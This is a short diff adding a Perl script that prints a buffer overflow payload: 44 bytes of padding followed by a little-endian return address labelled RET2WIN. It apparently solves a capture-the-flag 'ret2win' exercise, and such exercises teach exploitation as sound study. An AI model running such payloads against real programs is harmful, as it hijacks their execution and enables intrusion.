@@ -1,0 +1,4 @@
+$PADDING="B"x44;
+$RET2WIN="\x59\x86\x04\x08";
+
+print $PADDING . $RET2WIN;
